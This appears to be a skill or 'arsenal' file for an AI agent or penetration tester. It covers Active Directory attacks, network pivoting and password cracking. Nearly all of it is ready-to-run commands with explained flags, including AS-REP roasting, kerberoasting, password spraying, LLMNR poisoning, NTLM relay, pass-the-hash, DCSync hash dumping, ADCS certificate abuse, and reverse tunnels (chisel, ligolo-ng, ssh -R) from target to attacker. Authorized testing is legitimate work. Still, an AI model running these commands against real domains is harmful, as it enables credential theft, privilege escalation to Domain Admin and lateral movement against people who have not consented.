---
name: ad-pivot-arsenal
description: >
  One line: Active Directory, pivoting/tunneling, and password-cracking arsenal for authorized engagements.
  Trigger signals: "Active Directory", "domain", "kerberos", "kerberoast", "AS-REP", "BloodHound",
  "DCSync", "AD/.local domain", holding domain creds or a foothold. Authorized, in-scope targets only.
domain: ad
type: arsenal
stability: locked
modes: [pentest, bugbounty]
schema_version: 1
---

# Active Directory, pivoting & cracking arsenal

Loads on domain-joined targets, or once you hold a foothold/creds and need to reach
Domain Admin. Authorized, in-scope engagements only. Add the DC
to `/etc/hosts` (`IP dc01.corp.local corp.local`) early — Kerberos needs the FQDN.

## Enumeration

- **netexec / nxc (smb)** — the swiss-army first pass; null session, shares, users, policy.
  `nxc smb dc01.corp.local -u '' -p '' --shares --users --pass-pol`
  `-u '' -p ''` = null/anonymous auth; `--pass-pol` reveals the lockout threshold you must
  respect when spraying. Add `-M spider_plus` to loot readable shares, and `--rid-brute` to
  enumerate domain users over SAMR when null LDAP is closed but SMB null is open.
- **netexec (ldap)** — pull AS-REP-roastable and SPN users without touching Kerberos yet.
  `nxc ldap dc01.corp.local -u user -p pass --asreproast asrep.txt --kerberoasting kerb.txt`
  Also `--users --groups --password-not-required` for quick wins.
- **enum4linux-ng** — modern rewrite of enum4linux; broad SMB/RPC/LDAP dump in one shot.
  `enum4linux-ng -A dc01.corp.local` — `-A` = all simple enumeration (users, groups, shares, pol).
- **ldapsearch (anonymous)** — raw LDAP when null bind is allowed; great for descriptions
  (passwords hide there). `ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local"`
  `-x` = simple auth, `-b` = search base. Add `"(objectClass=user)" sAMAccountName description`.
  Gotcha: no base? grab it from `ldapsearch -x -H ldap://IP -s base namingContexts`.
- **rpcclient** — interactive MS-RPC; enumerate users/groups when SMB null is open.
  `rpcclient -U "" -N dc01.corp.local` then `enumdomusers`, `querydispinfo`, `enumdomgroups`.
  `-N` = no password.
- **kerbrute userenum** — validate usernames pre-auth via Kerberos (no lockout, very fast).
  `kerbrute userenum -d corp.local --dc dc01.corp.local users.txt`
  Confirms which names exist so you spray/roast a real list. Gotcha: needs the FQDN + reachable 88.
- **BloodHound + collectors** — maps the shortest path to DA; collect first, then think.
  From Linux: `bloodhound-python -d corp.local -u user -p pass -ns $TARGET -c All`
  On host: `SharpHound.exe -c All` (or `Invoke-BloodHound -CollectionMethod All`).
  Import the zip into BloodHound and run the "Shortest Path to Domain Admins" query.

## Credential attacks

- **impacket-GetNPUsers (AS-REP roast)** — users with "do not require pre-auth" leak a
  crackable hash with NO creds. `impacket-GetNPUsers corp.local/ -usersfile users.txt -request -no-pass -dc-ip $TARGET`
  With creds: `impacket-GetNPUsers corp.local/user:pass -request`. Crack the `$krb5asrep$` with
  hashcat **18200**. Why it works: the KDC hands back a TGT-material blob encrypted under the
  user's password key when pre-auth is off.
- **impacket-GetUserSPNs (kerberoast)** — any domain user can request service tickets for
  accounts with an SPN; the TGS is encrypted with the service account's password.
  `impacket-GetUserSPNs corp.local/user:pass -dc-ip $TARGET -request`
  Crack the `$krb5tgs$` with hashcat **13100**. Service accounts often have weak, static passwords.
- **Password spraying (nxc)** — one password across many users beats many passwords per user.
  `nxc smb dc01.corp.local -u users.txt -p 'Winter2025!' --continue-on-success`
  Gotcha: check `--pass-pol` first — spraying past the lockout threshold locks accounts and burns
  the domain. Space attempts under the observation window; one password per round.
- **responder (LLMNR/NBT-NS/mDNS poison)** — answer broadcast name lookups, capture NetNTLMv2.
  `responder -I tun0` — passively grabs hashes when a host mistypes a share. Crack with hashcat **5600**.
  Authorized lab only. Gotcha: disable SMB/HTTP servers in `Responder.conf` if you plan to relay instead.
- **impacket-ntlmrelayx (relay)** — forward captured NTLM auth to a target where SMB signing is off.
  `impacket-ntlmrelayx -tf targets.txt -smb2support` (add `-i` for interactive shell, `--delegate-access`).
  Pairs with responder (turn off its own SMB/HTTP listeners). Relaying to LDAP enables RBCD / ADCS ESC8.

## Lateral movement / execution

- **evil-winrm** — clean interactive shell over WinRM (5985) with password OR hash.
  `evil-winrm -i $TARGET -u user -p pass` | pass-the-hash: `evil-winrm -i IP -u user -H <NTLM>`
  Best UX once a user is in Remote Management Users. Upload/download built in.
- **impacket psexec / wmiexec / smbexec / atexec** — SYSTEM (psexec) or stealthier user-context
  exec. `impacket-psexec corp.local/user:pass@$TARGET` (drops a service — noisy, SYSTEM).
  `impacket-wmiexec corp.local/user:pass@IP` (semi-interactive, no disk artifact — prefer this).
  `smbexec`/`atexec` = fallbacks (service via SMB / scheduled task). All accept `-hashes :<NTLM>`.
- **netexec exec** — run a command everywhere you have rights in one line.
  `nxc smb targets.txt -u user -H <NTLM> -x 'whoami'` (`-X` for PowerShell). `-H` = pass-the-hash.
- **Pass-the-hash** — reuse the NTLM hash directly, no plaintext needed.
  `nxc smb IP -u user -H aad3b435...:31d6cfe0...` — the `-H`/`-hashes` flag is honored across nxc,
  evil-winrm, and every impacket tool. Why: NTLM auth proves knowledge of the hash, not the password.
- **Overpass-the-hash / pass-the-ticket** — turn a hash into a Kerberos TGT, or reuse a `.ccache`.
  `impacket-getTGT corp.local/user -hashes :<NTLM>` → `export KRB5CCNAME=user.ccache` →
  `impacket-wmiexec -k -no-pass corp.local/user@dc01.corp.local`. `-k` = use Kerberos ccache, `-no-pass`
  = don't prompt. Gotcha: Kerberos demands the FQDN (not IP) and a synced clock.
- **impacket-secretsdump** — dump hashes. DCSync: `impacket-secretsdump corp.local/user:pass@dc01.corp.local -just-dc`
  (`-just-dc` = pull NTDS via replication — needs DS-Replication rights; grabs krbtgt → golden ticket).
  Local SAM/LSA: `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` or over the wire on a target.

## ADCS

- **certipy find** — enumerate the CA and flag misconfigured templates (ESC1–ESC8).
  `certipy find -u user@corp.local -p pass -dc-ip $TARGET -vulnerable -stdout`
  `-vulnerable` = only show abusable templates. Look for `ESC1` (enrollee supplies subject).
- **ESC1 abuse (certipy req)** — request a cert as any user via a vulnerable template.
  `certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local`
  Then auth with the cert: `certipy auth -pfx administrator.pfx -dc-ip IP` → NT hash / TGT.
- **ESC8 (HTTP enrollment relay)** — relay NTLM to the CA web endpoint for a DC/admin cert.
  `impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
  Coerce auth (PetitPotam/printerbug) at the DC, capture its cert, then `certipy auth`.
- **Pass-the-cert** — use a `.pfx` to authenticate or to add RBCD via LDAP schannel.
  `certipy auth -pfx user.pfx` yields the NT hash; feed it back into PtH / secretsdump.

## Pivoting & tunneling

- **ligolo-ng** — the modern go-to; a real tun interface, no proxychains needed.
  Proxy (attacker): `sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert`
  Agent (target): `./agent -connect 10.10.x.x:11601 -ignore-cert`. In the proxy console: `session`,
  then `start`, and add a route: `sudo ip route add 172.16.1.0/24 dev ligolo`. Now reach the whole subnet natively.
- **chisel** — reverse SOCKS when you only have outbound; single Go binary both ends.
  Server (attacker): `chisel server -p 8000 --reverse`
  Client (target): `chisel client 10.10.x.x:8000 R:1080:socks` → SOCKS5 on your `127.0.0.1:1080`.
  Point proxychains at 1080. `R:` = reverse.
- **sshuttle** — VPN-like routing over a single SSH cred; no proxychains, transparent.
  `sshuttle -r user@$TARGET 172.16.1.0/24` — tunnels that subnet through the SSH host. `-x` to exclude.
- **ssh port forwards** — when you already have SSH on the pivot.
  `ssh -L 8080:127.0.0.1:80 user@pivot` (local) · `ssh -D 1080 user@pivot` (dynamic SOCKS) ·
  `ssh -R 4444:127.0.0.1:4444 user@attacker` (reverse, bring a port back). `-fN` to background without a shell.
- **proxychains** — force any TCP tool through your SOCKS pivot. Edit `/etc/proxychains4.conf`:
  set `socks5 127.0.0.1 1080` under `[ProxyList]`; then `proxychains nxc smb 172.16.1.10`.
  Gotcha: nmap through it must be `proxychains nmap -sT -Pn` (TCP-connect only; no ping/UDP over SOCKS).
- **socat** — quick relay/port bounce when you need a listener on the pivot.
  `socat TCP-LISTEN:8080,fork TCP:172.16.1.10:80` — forwards attacker→8080 to the internal host.

## Password cracking

- **hashcat** — GPU cracker; pick the mode by hash type.
  `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`
  Common modes: **1000** NTLM · **5600** NetNTLMv2 · **18200** AS-REP · **13100** Kerberoast (TGS) ·
  **1800** sha512crypt (`$6$`, Linux shadow) · **500** md5crypt (`$1$`) · **22000** WPA/WPA2.
  `-r` applies rules; add `--username` if the file has `user:hash` lines.
- **john** — CPU fallback / great for odd formats and `*2john` helpers.
  `john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerb.txt` then `john --show ...`.
  Use `zip2john`, `ssh2john`, `keepass2john` to extract crackable hashes from files.
- **hashid / name-that-hash** — identify an unknown hash before you waste a run.
  `hashid '<hash>'` or `nth -t '<hash>'` (name-that-hash) — maps the format to the hashcat/john mode.

## Discipline / gotchas

- **Kerberos clock skew** — `KRB_AP_ERR_SKEW` means your clock differs from the DC by >5 min.
  Fix: `sudo ntpdate dc01.corp.local` or wrap the tool in `faketime "$(...)" impacket-...`.
- **Use the FQDN for Kerberos** — `-k` auth against an IP fails; add the DC to `/etc/hosts` and
  target `dc01.corp.local`. SPNs are name-based, not IP-based.
- **proxychains + nmap** — always `-sT -Pn` (TCP connect, skip host discovery); SYN/UDP/ping don't
  traverse SOCKS and will hang or lie.
- **Account lockout** — read `--pass-pol` before spraying; stay under the threshold and respect the
  observation window, or you lock the accounts and disrupt the domain for everyone.
- **BloodHound first** — it shows the shortest path to Domain Admin; collect and analyze before
  blindly roasting/relaying. The graph usually names your next move.
